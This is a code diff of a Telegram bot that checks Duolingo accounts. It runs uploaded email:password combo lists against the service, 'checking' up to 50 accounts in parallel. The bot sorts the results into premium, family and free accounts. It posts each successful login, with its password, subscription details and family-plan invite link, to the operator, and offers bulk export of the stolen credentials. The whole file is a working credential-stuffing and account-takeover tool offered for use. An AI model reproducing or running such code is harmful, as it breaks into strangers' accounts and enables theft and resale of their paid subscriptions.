@@ -1,12 +1,11 @@
 import telebot
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import requests
 import json
 import time
 import uuid
 import logging
 import threading
-import signal
-import sys
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -26,29 +25,17 @@ stop_flag = False
 current_executor = None
 current_futures = None
 
-# Store hits for inline display
+# Store hits
 all_super_hits = []
 all_family_hits = []
 all_free_accounts = []
-current_page = 0
 hits_per_page = 10
 
-# Stats counters
+# Stats
 super_count = 0
 family_count = 0
 free_count = 0
 fail_count = 0
-error_count = 0
-error_types = {}
-
-def signal_handler(sig, frame):
-    global stop_flag
-    print("\n🛑 Stopping...")
-    stop_flag = True
-    sys.exit(0)
-
-signal.signal(signal.SIGINT, signal_handler)
-signal.signal(signal.SIGTERM, signal_handler)
 
 def is_admin(user_id):
     return user_id in ADMIN_IDS
@@ -112,7 +99,7 @@ def extract_subscription_details(data):
             if sub_info.get("productId"):
                 details["product_id"] = sub_info.get("productId")
             if sub_info.get("renewing") is not None:
-                details["renewing"] = "Yes" if sub_info.get("renewing") else "No"
+                details["renewing"] = "Yes ✅" if sub_info.get("renewing") else "No ❌"
             if sub_info.get("expectedExpiration"):
                 expiry_ms = sub_info.get("expectedExpiration")
                 details["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
@@ -200,75 +187,133 @@ def check_single_account(email, password):
         if invite_token:
             sub_details["invite_token"] = invite_token
         
+        # Build beautiful box UI for HIT
         if plan_type == "FAMILY":
             result = f"""
-👨‍👩‍👧 **FAMILY PREMIUM HIT!**
+╔════════════════════════════════════╗
+║      🎉 PREMIUM ACCOUNT FOUND      ║
+╚════════════════════════════════════╝
 
-📊 **ACCOUNT:**
-├─ Email: `{email}:{password}`
-├─ Username: `{username}`
-├─ Total XP: `{total_xp:,}`
-├─ Streak: `{streak} days` 🔥
-├─ Learning: `{learning_lang}` (from `{from_lang}`)
-├─ Created: `{created_date}`
-└─ Plan: 👨‍👩‍👧 **FAMILY PLAN**
+┌────────────────────────────────────┐
+│        👨‍👩‍👧 FAMILY PLAN           │
+├────────────────────────────────────┤
+│  📧 Email    : `{email}:{password}` │
+│  👤 Username : `{username}`         │
+│  ⭐ XP       : `{total_xp:,}`       │
+│  🔥 Streak   : `{streak} days`      │
+│  🌍 Learning : `{learning_lang}` → `{from_lang}` │
+│  📅 Created  : `{created_date}`     │
+└────────────────────────────────────┘
 
-💎 **SUBSCRIPTION:**
-├─ Product: `{sub_details['product_id']}`
-├─ Renew: `{sub_details['renewing']}`
-└─ Expires: `{sub_details['expiry']}`
+┌────────────────────────────────────┐
+│         💎 SUBSCRIPTION            │
+├────────────────────────────────────┤
+│  Product    : `{sub_details['product_id']}` │
+│  Renew      : `{sub_details['renewing']}`   │
+│  Expires    : `{sub_details['expiry']}`     │
+└────────────────────────────────────┘
 """
             if sub_details["invite_token"]:
-                result += f"\n🔗 **INVITE LINK:**\nhttps://www.duolingo.com/family-plan?invite={sub_details['invite_token']}"
+                result += f"\n🔗 **INVITE LINK:**\n`https://www.duolingo.com/family-plan?invite={sub_details['invite_token']}`"
         else:
             result = f"""
-👑 **SUPER PREMIUM HIT!**
+╔════════════════════════════════════╗
+║      🎉 PREMIUM ACCOUNT FOUND      ║
+╚════════════════════════════════════╝
 
-📊 **ACCOUNT:**
-├─ Email: `{email}:{password}`
-├─ Username: `{username}`
-├─ Total XP: `{total_xp:,}`
-├─ Streak: `{streak} days` 🔥
-├─ Learning: `{learning_lang}` (from `{from_lang}`)
-├─ Created: `{created_date}`
-└─ Plan: 👑 **SUPER PREMIUM**
+┌────────────────────────────────────┐
+│           👑 SUPER PREMIUM         │
+├────────────────────────────────────┤
+│  📧 Email    : `{email}:{password}` │
+│  👤 Username : `{username}`         │
+│  ⭐ XP       : `{total_xp:,}`       │
+│  🔥 Streak   : `{streak} days`      │
+│  🌍 Learning : `{learning_lang}` → `{from_lang}` │
+│  📅 Created  : `{created_date}`     │
+└────────────────────────────────────┘
 
-💎 **SUBSCRIPTION:**
-├─ Product: `{sub_details['product_id']}`
-├─ Renew: `{sub_details['renewing']}`
-└─ Expires: `{sub_details['expiry']}`
+┌────────────────────────────────────┐
+│         💎 SUBSCRIPTION            │
+├────────────────────────────────────┤
+│  Product    : `{sub_details['product_id']}` │
+│  Renew      : `{sub_details['renewing']}`   │
+│  Expires    : `{sub_details['expiry']}`     │
+└────────────────────────────────────┘
 """
         
-        result += f"\n📱 Checked by: [ DUOLINGO ] BY ThuYa V3"
+        result += f"\n\n📱 Checked by: [ DUOLINGO ] BY ThuYa V3"
         
         return email, password, "HIT", result, plan_type
         
-    except requests.exceptions.Timeout:
-        return email, password, "FAIL", "Timeout", None
-    except requests.exceptions.ConnectionError:
-        return email, password, "FAIL", "Connection Error", None
     except Exception as e:
         return email, password, "FAIL", str(e)[:40], None
 
-def make_progress_bar(percent, width=20):
-    filled = int(width * percent / 100)
-    bar = "▓" * filled + "░" * (width - filled)
-    return f"[{bar}] {percent:.1f}%"
+def send_main_menu(chat_id):
+    global super_count, family_count
+    
+    total_hits = len(all_super_hits) + len(all_family_hits)
+    today_hits = super_count + family_count
+    
+    # Get admin name
+    admin_name = "thuyaaungzaw"
+    
+    menu_text = f"""
+╔════════════════════════════════════╗
+║       🦉 DUOLINGO PREMIUM          ║
+║          ACCOUNT CHECKER           ║
+║            BY ThuYa V3             ║
+╚════════════════════════════════════╝
+
+┌────────────────────────────────────┐
+│           👤 USER PROFILE          │
+├────────────────────────────────────┤
+│  Name     : @{admin_name}          │
+│  ID       : {ADMIN_IDS[0]}         │
+│  Role     : 👑 Premium Owner       │
+└────────────────────────────────────┘
+
+┌────────────────────────────────────┐
+│          ⚙️ SYSTEM STATUS          │
+├────────────────────────────────────┤
+│  Gateways : 🟢 {MAX_THREADS}/50 Online │
+│  Mode     : 🔥 Active              │
+└────────────────────────────────────┘
+
+┌────────────────────────────────────┐
+│           📊 QUICK STATS           │
+├────────────────────────────────────┤
+│  Today HIT   : 👑 {super_count}  👨‍👩‍👧 {family_count} │
+│  Total HIT   : {total_hits}        │
+└────────────────────────────────────┘
+"""
+    
+    markup = InlineKeyboardMarkup(row_width=2)
+    markup.add(InlineKeyboardButton("🚀 START CHECKING", callback_data="start_check"))
+    markup.row(
+        InlineKeyboardButton("📊 STATS", callback_data="my_stats"),
+        InlineKeyboardButton("⚙️ SETTINGS", callback_data="tools")
+    )
+    markup.row(
+        InlineKeyboardButton("💾 HITS", callback_data="view_hits"),
+        InlineKeyboardButton("❌ EXIT", callback_data="close_panel")
+    )
+    
+    bot.send_message(chat_id, menu_text, parse_mode='Markdown', reply_markup=markup)
 
 def send_hits_list(chat_id, page=0):
     global all_super_hits, all_family_hits, hits_per_page
     
     total_hits = len(all_super_hits) + len(all_family_hits)
     if total_hits == 0:
-        bot.send_message(chat_id, "📭 No premium hits yet.", parse_mode="Markdown")
+        bot.send_message(chat_id, "📭 No premium hits yet.", parse_mode='Markdown')
         return
     
-    # Combine all hits with labels
+    # Combine all hits
     all_hits = []
     for email, pwd, result in all_super_hits:
-        all_hits.append(("👑", email, pwd, result))
+        all_hits.append(("👑 SUPER", email, pwd))
     for email, pwd, result in all_family_hits:
-        all_hits.append(("👨‍👩‍👧", email, pwd, result))
+        all_hits.append(("👨‍👩‍👧 FAMILY", email, pwd))
     
     total_pages = (len(all_hits) + hits_per_page - 1) // hits_per_page
     if page >= total_pages:
@@ -280,17 +325,19 @@ def send_hits_list(chat_id, page=0):
     end = min(start + hits_per_page, len(all_hits))
     
     hit_list_text = ""
-    for i, (icon, email, pwd, _) in enumerate(all_hits[start:end], start=start+1):
-        hit_list_text += f"{i}. {icon} `{email}:{pwd}`\n"
+    for i, (plan, email, pwd) in enumerate(all_hits[start:end], start=start+1):
+        hit_list_text += f"  {i}. {plan} │ `{email}:{pwd}`\n"
     
     message_text = f"""
 ╔════════════════════════════════════╗
-║         💾 PREMIUM HITS            ║
+║           💾 PREMIUM HITS          ║
 ╚════════════════════════════════════╝
 
-👑 SUPER PREMIUM: {len(all_super_hits)}
-👨‍👩‍👧 FAMILY PLAN: {len(all_family_hits)}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+┌────────────────────────────────────┐
+│  👑 SUPER PREMIUM : {len(all_super_hits)}    │
+│  👨‍👩‍👧 FAMILY PLAN : {len(all_family_hits)}    │
+└────────────────────────────────────┘
+
 📋 Page {page+1}/{total_pages}
 
 {hit_list_text}
@@ -298,301 +345,118 @@ def send_hits_list(chat_id, page=0):
 💡 Click COPY ALL to get full details
 """
     
-    markup = telebot.types.InlineKeyboardMarkup(row_width=4)
+    markup = InlineKeyboardMarkup(row_width=3)
     buttons = []
-    
     if page > 0:
-        buttons.append(telebot.types.InlineKeyboardButton("◀️ PREV", callback_data=f"hits_page_{page-1}"))
-    buttons.append(telebot.types.InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
+        buttons.append(InlineKeyboardButton("◀️ PREV", callback_data=f"hits_page_{page-1}"))
+    buttons.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
     if page < total_pages - 1:
-        buttons.append(telebot.types.InlineKeyboardButton("NEXT ▶️", callback_data=f"hits_page_{page+1}"))
-    
+        buttons.append(InlineKeyboardButton("NEXT ▶️", callback_data=f"hits_page_{page+1}"))
     markup.row(*buttons)
     markup.row(
-        telebot.types.InlineKeyboardButton("📋 COPY ALL", callback_data="copy_all_hits"),
-        telebot.types.InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_hits"),
-        telebot.types.InlineKeyboardButton("⬅️ MAIN MENU", callback_data="main_menu")
+        InlineKeyboardButton("📋 COPY ALL", callback_data="copy_all_hits"),
+        InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_hits"),
+        InlineKeyboardButton("⬅️ MAIN MENU", callback_data="main_menu")
     )
     
-    bot.send_message(chat_id, message_text, parse_mode="Markdown", reply_markup=markup)
+    bot.send_message(chat_id, message_text, parse_mode='Markdown', reply_markup=markup)
 
-def process_batch(chat_id, combos, batch_num, total_batches, progress_msg_id, overall_start_time, overall_total):
-    global stop_flag, current_executor, current_futures
-    global super_count, family_count, free_count, fail_count, error_count, error_types
-    global all_super_hits, all_family_hits, all_free_accounts
-    global MAX_THREADS
-    
-    if stop_flag:
-        return False
-    
-    batch_total = len(combos)
-    completed = 0
-    last_update = 0
-    
-    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
-        current_executor = executor
-        futures = {executor.submit(check_single_account, email, pwd): (email, pwd) for email, pwd in combos}
-        current_futures = futures
-        
-        for future in as_completed(futures):
-            if stop_flag:
-                for f in futures:
-                    f.cancel()
-                executor.shutdown(wait=False, cancel_futures=True)
-                return False
-            
-            try:
-                email, password, status, detail, plan_type = future.result(timeout=30)
-            except Exception as e:
-                continue
-            
-            completed += 1
-            overall_completed = (batch_num - 1) * BATCH_SIZE + completed
-            overall_percent = (overall_completed / overall_total) * 100
-            elapsed = time.time() - overall_start_time
-            
-            if status == "HIT":
-                if plan_type == "FAMILY":
-                    family_count += 1
-                    all_family_hits.append((email, password, detail))
-                else:
-                    super_count += 1
-                    all_super_hits.append((email, password, detail))
-                # Send HIT immediately
-                bot.send_message(chat_id, detail, parse_mode="Markdown")
-                logging.info(f"✅ {plan_type} HIT: {email}")
-            elif status == "FREE":
-                free_count += 1
-                all_free_accounts.append((email, password, detail))
-                logging.info(f"⚠️ FREE: {email}")
-            elif status == "STOPPED":
-                return False
-            else:
-                fail_count += 1
-                logging.info(f"❌ FAIL: {email}")
-            
-            if completed - last_update >= 500 or completed == batch_total:
-                last_update = completed
-                progress_bar = make_progress_bar(overall_percent)
-                
-                progress_text = f"""
-╔════════════════════════════════════╗
-║     🦉 DUOLINGO CHECKER            ║
-║     BY ThuYa V3                    ║
-╚════════════════════════════════════╝
-
-⏱️ **Time:** `{elapsed:.1f}s`
-📦 **Batch:** `{batch_num}/{total_batches}`
-
-`{progress_bar}`
-📍 **Checked:** `{overall_completed}/{overall_total}`
-🚀 **Threads:** `{MAX_THREADS}`
-
-┌────────────────────────────────────┐
-│ 📊 RESULTS SUMMARY                 │
-├────────────────────────────────────┤
-│ 👑 SUPER PREMIUM   :  `{super_count}`    │
-│ 👨‍👩‍👧 FAMILY PLAN   :  `{family_count}`    │
-│ ⚠️ FREE ACCOUNT    :  `{free_count}`    │
-│ ❌ WRONG PASS      :  `{fail_count}`    │
-└────────────────────────────────────┘
-
-_Use /stop to cancel_
-"""
-                try:
-                    bot.edit_message_text(progress_text, chat_id, progress_msg_id, parse_mode="Markdown")
-                except:
-                    pass
-    
-    current_executor = None
-    current_futures = None
-    return True
-
-def process_combos(chat_id, combos, message_id):
-    global checking_active, stop_flag
-    global super_count, family_count, free_count, fail_count, error_count, error_types
-    global all_super_hits, all_family_hits, all_free_accounts
-    global MAX_THREADS
-    
-    checking_active = True
-    stop_flag = False
-    
-    super_count = 0
-    family_count = 0
-    free_count = 0
-    fail_count = 0
-    error_count = 0
-    error_types = {}
-    all_super_hits = []
-    all_family_hits = []
-    all_free_accounts = []
-    
-    total = len(combos)
-    total_batches = (total + BATCH_SIZE - 1) // BATCH_SIZE
-    overall_start_time = time.time()
-    
-    progress_text = f"""
-╔════════════════════════════════════╗
-║     🦉 DUOLINGO CHECKER            ║
-║     BY ThuYa V3                    ║
-╚════════════════════════════════════╝
-
-⏱️ **Time:** `0.0s`
-📦 **Batch:** `1/{total_batches}`
-
-`[░░░░░░░░░░░░░░░░░░░░] 0.0%`
-📍 **Checked:** `0/{total}`
-🚀 **Threads:** `{MAX_THREADS}`
-
-┌────────────────────────────────────┐
-│ 📊 RESULTS SUMMARY                 │
-├────────────────────────────────────┤
-│ 👑 SUPER PREMIUM   :  `0`          │
-│ 👨‍👩‍👧 FAMILY PLAN   :  `0`          │
-│ ⚠️ FREE ACCOUNT    :  `0`          │
-│ ❌ WRONG PASS      :  `0`          │
-└────────────────────────────────────┘
-
-_Use /stop to cancel_
-"""
-    try:
-        bot.edit_message_text(progress_text, chat_id, message_id, parse_mode="Markdown")
-    except:
-        pass
-    
-    for batch_num in range(1, total_batches + 1):
-        if stop_flag:
-            bot.send_message(chat_id, "🛑 **Stopped by user.**", parse_mode="Markdown")
-            break
-        
-        start_idx = (batch_num - 1) * BATCH_SIZE
-        end_idx = min(start_idx + BATCH_SIZE, total)
-        batch_combos = combos[start_idx:end_idx]
-        
-        logging.info(f"📦 Processing batch {batch_num}/{total_batches} ({len(batch_combos)} combos)")
-        
-        success = process_batch(chat_id, batch_combos, batch_num, total_batches, message_id, overall_start_time, total)
-        
-        if not success:
-            break
-        
-        time.sleep(2)
-    
-    elapsed = time.time() - overall_start_time
-    progress_bar = make_progress_bar(100)
-    
-    final_summary = f"""
-╔════════════════════════════════════╗
-║     🦉 DUOLINGO CHECKER            ║
-║     BY ThuYa V3                    ║
-╚════════════════════════════════════╝
-
-⏱️ **Time:** `{elapsed:.1f}s`
-
-`{progress_bar}`
-📍 **Checked:** `{total}/{total}`
-🚀 **Threads:** `{MAX_THREADS}`
-
-┌────────────────────────────────────┐
-│ 📊 FINAL RESULTS                   │
-├────────────────────────────────────┤
-│ 👑 SUPER PREMIUM   :  `{super_count}`    │
-│ 👨‍👩‍👧 FAMILY PLAN   :  `{family_count}`    │
-│ ⚠️ FREE ACCOUNT    :  `{free_count}`    │
-│ ❌ WRONG PASS      :  `{fail_count}`    │
-└────────────────────────────────────┘
-
-💾 Click [💾 HITS] in main menu to view all premium accounts
-"""
-    bot.send_message(chat_id, final_summary, parse_mode="Markdown")
-    
-    # Send main menu
-    send_main_menu(chat_id)
-    
-    checking_active = False
-    stop_flag = False
-
-def send_main_menu(chat_id):
-    global all_super_hits, all_family_hits, MAX_THREADS
-    
-    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
-    markup.row(
-        telebot.types.InlineKeyboardButton("📂 START CHECKING", callback_data="start_checking"),
-        telebot.types.InlineKeyboardButton("💾 HITS", callback_data="view_hits")
-    )
-    markup.row(
-        telebot.types.InlineKeyboardButton("📊 STATS", callback_data="view_stats"),
-        telebot.types.InlineKeyboardButton("⚙️ THREADS", callback_data="thread_settings")
-    )
-    markup.row(
-        telebot.types.InlineKeyboardButton("❌ CLOSE", callback_data="close_panel")
-    )
+def send_stats(chat_id):
+    global super_count, family_count, free_count, fail_count, MAX_THREADS
+    global all_super_hits, all_family_hits
     
     total_hits = len(all_super_hits) + len(all_family_hits)
+    total_checked = super_count + family_count + free_count + fail_count
     
-    menu_text = f"""
+    stats_text = f"""
 ╔════════════════════════════════════╗
-║     🦉 DUOLINGO PREMIUM CHECKER    ║
-║     BY ThuYa V3                    ║
+║            📊 STATISTICS           ║
 ╚════════════════════════════════════╝
 
 ┌────────────────────────────────────┐
-│         👤 ADMIN PANEL             │
+│           TODAY'S STATS            │
 ├────────────────────────────────────┤
-│ • Total HIT: `{total_hits}`        │
-│ • System: 🟢 Online                │
-│ • Threads: `{MAX_THREADS}`         │
+│  👑 SUPER PREMIUM : {super_count}         │
+│  👨‍👩‍👧 FAMILY PLAN : {family_count}         │
+│  ⚠️ FREE ACCOUNTS : {free_count}          │
+│  ❌ FAILED       : {fail_count}           │
 └────────────────────────────────────┘
 
-📎 Send combo file or use buttons below
+┌────────────────────────────────────┐
+│           TOTAL STATS              │
+├────────────────────────────────────┤
+│  📋 CHECKED      : {total_checked}        │
+│  🎯 TOTAL HITS   : {total_hits}           │
+└────────────────────────────────────┘
+
+┌────────────────────────────────────┐
+│           SYSTEM INFO              │
+├────────────────────────────────────┤
+│  ⚙️ THREADS      : {MAX_THREADS}          │
+│  🟢 STATUS       : Online          │
+└────────────────────────────────────┘
 """
-    bot.send_message(chat_id, menu_text, parse_mode="Markdown", reply_markup=markup)
+    markup = InlineKeyboardMarkup()
+    markup.add(InlineKeyboardButton("⬅️ MAIN MENU", callback_data="main_menu"))
+    bot.send_message(chat_id, stats_text, parse_mode='Markdown', reply_markup=markup)
 
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
-    global MAX_THREADS, current_page
+    global MAX_THREADS, checking_active, stop_flag, current_executor, current_futures
+    global super_count, family_count, free_count, fail_count
+    global all_super_hits, all_family_hits
     
-    if call.data == "start_checking":
+    if call.data == "start_check":
         bot.answer_callback_query(call.id)
-        bot.send_message(call.message.chat.id, "📎 Send your **email:pass** combo file (.txt)", parse_mode="Markdown")
+        if checking_active:
+            bot.send_message(call.message.chat.id, "⚠️ A check is already running. Use /stop first.")
+            return
+        bot.send_message(call.message.chat.id, "📎 Send your *email:pass* combo file (.txt)", parse_mode='Markdown')
+    
+    elif call.data == "my_stats":
+        bot.answer_callback_query(call.id)
+        send_stats(call.message.chat.id)
     
     elif call.data == "view_hits":
         bot.answer_callback_query(call.id)
         send_hits_list(call.message.chat.id, 0)
     
-    elif call.data == "view_stats":
+    elif call.data == "tools":
         bot.answer_callback_query(call.id)
-        total_hits = len(all_super_hits) + len(all_family_hits)
-        stats_text = f"""
-╔════════════════════════════════════╗
-║           📊 STATISTICS            ║
-╚════════════════════════════════════╝
-
-👑 SUPER PREMIUM: `{len(all_super_hits)}`
-👨‍👩‍👧 FAMILY PLAN: `{len(all_family_hits)}`
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📋 TOTAL HITS: `{total_hits}`
-
-⚙️ THREADS: `{MAX_THREADS}`
-🟢 STATUS: Online
-"""
-        bot.send_message(call.message.chat.id, stats_text, parse_mode="Markdown")
+        markup = InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            InlineKeyboardButton("⚙️ SET THREADS", callback_data="thread_settings"),
+            InlineKeyboardButton("🗑️ CLEAR HITS", callback_data="clear_hits")
+        )
+        markup.add(InlineKeyboardButton("⬅️ MAIN MENU", callback_data="main_menu"))
+        bot.send_message(call.message.chat.id, "⚙️ **SETTINGS MENU**\n━━━━━━━━━━━━━━━━━━\nSelect an option:", parse_mode='Markdown', reply_markup=markup)
     
     elif call.data == "thread_settings":
         bot.answer_callback_query(call.id)
-        markup = telebot.types.InlineKeyboardMarkup(row_width=3)
+        markup = InlineKeyboardMarkup(row_width=3)
         markup.row(
-            telebot.types.InlineKeyboardButton("20", callback_data="set_threads_20"),
-            telebot.types.InlineKeyboardButton("30", callback_data="set_threads_30"),
-            telebot.types.InlineKeyboardButton("50", callback_data="set_threads_50")
+            InlineKeyboardButton("20", callback_data="set_threads_20"),
+            InlineKeyboardButton("30", callback_data="set_threads_30"),
+            InlineKeyboardButton("50", callback_data="set_threads_50")
         )
-        markup.row(telebot.types.InlineKeyboardButton("⬅️ BACK", callback_data="main_menu"))
-        bot.send_message(call.message.chat.id, f"⚙️ Current Threads: `{MAX_THREADS}`\nSelect new value:", parse_mode="Markdown", reply_markup=markup)
+        markup.add(InlineKeyboardButton("⬅️ BACK", callback_data="tools"))
+        bot.send_message(call.message.chat.id, f"⚙️ Current Threads: `{MAX_THREADS}`\nSelect new value:", parse_mode='Markdown', reply_markup=markup)
     
     elif call.data.startswith("set_threads_"):
         new_threads = int(call.data.split("_")[2])
         MAX_THREADS = new_threads
         bot.answer_callback_query(call.id, f"Threads set to {new_threads}")
+        send_main_menu(call.message.chat.id)
+    
+    elif call.data == "clear_hits":
+        bot.answer_callback_query(call.id)
+        all_super_hits = []
+        all_family_hits = []
+        super_count = 0
+        family_count = 0
+        free_count = 0
+        fail_count = 0
+        bot.send_message(call.message.chat.id, "✅ All hits cleared!")
         send_main_menu(call.message.chat.id)
     
     elif call.data == "main_menu":
@@ -608,94 +472,161 @@ def callback_handler(call):
     
     elif call.data == "refresh_hits":
         bot.answer_callback_query(call.id)
-        send_hits_list(call.message.chat.id, current_page)
+        send_hits_list(call.message.chat.id, 0)
     
     elif call.data == "copy_all_hits":
         bot.answer_callback_query(call.id)
         all_hits_text = ""
-        for email, pwd, _ in all_super_hits:
+        for email, pwd, result in all_super_hits:
             all_hits_text += f"{email}:{pwd}\n"
-        for email, pwd, _ in all_family_hits:
+        for email, pwd, result in all_family_hits:
             all_hits_text += f"{email}:{pwd}\n"
         
         if all_hits_text:
-            # Split if too long (Telegram limit 4096)
             if len(all_hits_text) > 4000:
                 parts = [all_hits_text[i:i+4000] for i in range(0, len(all_hits_text), 4000)]
                 for i, part in enumerate(parts):
-                    bot.send_message(call.message.chat.id, f"📋 **Premium Hits (Part {i+1}/{len(parts)}):**\n```\n{part}```", parse_mode="Markdown")
+                    bot.send_message(call.message.chat.id, f"📋 **Premium Hits (Part {i+1}/{len(parts)}):**\n```\n{part}```", parse_mode='Markdown')
             else:
-                bot.send_message(call.message.chat.id, f"📋 **All Premium Hits:**\n```\n{all_hits_text}```", parse_mode="Markdown")
+                bot.send_message(call.message.chat.id, f"📋 **All Premium Hits:**\n```\n{all_hits_text}```", parse_mode='Markdown')
         else:
             bot.send_message(call.message.chat.id, "📭 No hits to copy.")
     
     elif call.data.startswith("hits_page_"):
         page = int(call.data.split("_")[2])
-        current_page = page
-        bot.answer_callback_query(call.id)
+        send_hits_list(call.message.chat.id, page)
+
+def process_combos(chat_id, combos):
+    global checking_active, stop_flag, current_executor, current_futures
+    global super_count, family_count, free_count, fail_count
+    global all_super_hits, all_family_hits, all_free_accounts
+    
+    checking_active = True
+    stop_flag = False
+    
+    super_count = 0
+    family_count = 0
+    free_count = 0
+    fail_count = 0
+    all_super_hits = []
+    all_family_hits = []
+    all_free_accounts = []
+    
+    total = len(combos)
+    completed = 0
+    start_time = time.time()
+    
+    status_msg = bot.send_message(chat_id, "🔄 Starting check...")
+    
+    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+        current_executor = executor
+        futures = {executor.submit(check_single_account, email, pwd): (email, pwd) for email, pwd in combos}
+        current_futures = futures
         
-        total_hits = len(all_super_hits) + len(all_family_hits)
-        if total_hits == 0:
-            bot.edit_message_text("📭 No premium hits yet.", call.message.chat.id, call.message.message_id)
-            return
-        
-        all_hits = []
-        for email, pwd, result in all_super_hits:
-            all_hits.append(("👑", email, pwd, result))
-        for email, pwd, result in all_family_hits:
-            all_hits.append(("👨‍👩‍👧", email, pwd, result))
-        
-        total_pages = (len(all_hits) + hits_per_page - 1) // hits_per_page
-        if page >= total_pages:
-            page = total_pages - 1
-        if page < 0:
-            page = 0
-        
-        start = page * hits_per_page
-        end = min(start + hits_per_page, len(all_hits))
-        
-        hit_list_text = ""
-        for i, (icon, email, pwd, _) in enumerate(all_hits[start:end], start=start+1):
-            hit_list_text += f"{i}. {icon} `{email}:{pwd}`\n"
-        
-        message_text = f"""
+        for future in as_completed(futures):
+            if stop_flag:
+                for f in futures:
+                    f.cancel()
+                executor.shutdown(wait=False, cancel_futures=True)
+                break
+            
+            completed += 1
+            percent = (completed / total) * 100
+            elapsed = time.time() - start_time
+            
+            try:
+                email, password, status, detail, plan_type = future.result(timeout=30)
+            except:
+                continue
+            
+            if status == "HIT":
+                if plan_type == "FAMILY":
+                    family_count += 1
+                    all_family_hits.append((email, password, detail))
+                else:
+                    super_count += 1
+                    all_super_hits.append((email, password, detail))
+                # Send HIT immediately with beautiful box UI
+                bot.send_message(chat_id, detail, parse_mode='Markdown')
+                logging.info(f"✅ HIT: {email}")
+            elif status == "FREE":
+                free_count += 1
+                logging.info(f"⚠️ FREE: {email}")
+            elif status == "STOPPED":
+                break
+            else:
+                fail_count += 1
+                logging.info(f"❌ FAIL: {email}")
+            
+            # Update progress every 100 combos
+            if completed % 100 == 0 or completed == total:
+                bar_length = int(percent / 5)
+                progress_bar = "▓" * bar_length + "░" * (20 - bar_length)
+                progress_text = f"""
 ╔════════════════════════════════════╗
-║         💾 PREMIUM HITS            ║
+║         🦉 CHECKING STATUS         ║
 ╚════════════════════════════════════╝
 
-👑 SUPER PREMIUM: {len(all_super_hits)}
-👨‍👩‍👧 FAMILY PLAN: {len(all_family_hits)}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📋 Page {page+1}/{total_pages}
+┌────────────────────────────────────┐
+│  ⏱️ Time     : {elapsed:.1f}s              │
+│  📍 Checked  : {completed}/{total}         │
+│  🚀 Threads  : {MAX_THREADS}               │
+└────────────────────────────────────┘
 
-{hit_list_text}
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-💡 Click COPY ALL to get full details
+[{progress_bar}] {percent:.1f}%
+
+┌────────────────────────────────────┐
+│  👑 SUPER     : {super_count}              │
+│  👨‍👩‍👧 FAMILY   : {family_count}              │
+│  ⚠️ FREE      : {free_count}              │
+│  ❌ FAIL      : {fail_count}              │
+└────────────────────────────────────┘
+
+💡 Use /stop to cancel
 """
-        
-        markup = telebot.types.InlineKeyboardMarkup(row_width=4)
-        buttons = []
-        if page > 0:
-            buttons.append(telebot.types.InlineKeyboardButton("◀️ PREV", callback_data=f"hits_page_{page-1}"))
-        buttons.append(telebot.types.InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
-        if page < total_pages - 1:
-            buttons.append(telebot.types.InlineKeyboardButton("NEXT ▶️", callback_data=f"hits_page_{page+1}"))
-        
-        markup.row(*buttons)
-        markup.row(
-            telebot.types.InlineKeyboardButton("📋 COPY ALL", callback_data="copy_all_hits"),
-            telebot.types.InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_hits"),
-            telebot.types.InlineKeyboardButton("⬅️ MAIN MENU", callback_data="main_menu")
-        )
-        
-        bot.edit_message_text(message_text, call.message.chat.id, call.message.message_id, parse_mode="Markdown", reply_markup=markup)
+                try:
+                    bot.edit_message_text(progress_text, status_msg.message_id, chat_id, parse_mode='Markdown')
+                except:
+                    pass
+    
+    # Final summary
+    elapsed = time.time() - start_time
+    total_hits = super_count + family_count
+    final_text = f"""
+╔════════════════════════════════════╗
+║         ✅ CHECK COMPLETED         ║
+╚════════════════════════════════════╝
+
+┌────────────────────────────────────┐
+│  ⏱️ Time     : {elapsed:.1f}s              │
+│  📍 Total    : {total}                    │
+│  🚀 Threads  : {MAX_THREADS}               │
+└────────────────────────────────────┘
+
+┌────────────────────────────────────┐
+│  👑 SUPER PREMIUM : {super_count}         │
+│  👨‍👩‍👧 FAMILY PLAN : {family_count}         │
+│  ⚠️ FREE ACCOUNTS : {free_count}          │
+│  ❌ FAILED       : {fail_count}           │
+└────────────────────────────────────┘
+
+💾 Total Hits: {total_hits}
+
+Click 💾 HITS in main menu to view all premium accounts
+"""
+    bot.send_message(chat_id, final_text, parse_mode='Markdown')
+    send_main_menu(chat_id)
+    
+    checking_active = False
+    stop_flag = False
+    current_executor = None
+    current_futures = None
 
 @bot.message_handler(commands=['start'])
 def start_command(message):
     if not is_admin(message.from_user.id):
         bot.reply_to(message, "⛔ Unauthorized user.")
         return
-    
     send_main_menu(message.chat.id)
 
 @bot.message_handler(commands=['stop'])
@@ -708,16 +639,12 @@ def stop_command(message):
     
     if checking_active:
         stop_flag = True
-        
         if current_futures:
             for future in current_futures:
                 future.cancel()
-        
         if current_executor:
             current_executor.shutdown(wait=False, cancel_futures=True)
-        
-        bot.reply_to(message, "🛑 **Stopped immediately!**")
-        logging.info(f"🛑 Stop command from {message.from_user.id}")
+        bot.reply_to(message, "🛑 **Stopped immediately!**", parse_mode='Markdown')
     else:
         bot.reply_to(message, "ℹ️ No active check.")
 
@@ -750,16 +677,16 @@ def handle_file(message):
         bot.edit_message_text("❌ No valid combos. Format: email:pass", status_msg.chat.id, status_msg.message_id)
         return
     
-    bot.edit_message_text(f"📥 `{len(combos)}` combos loaded.\n🚀 Starting with {MAX_THREADS} threads...", status_msg.chat.id, status_msg.message_id, parse_mode="Markdown")
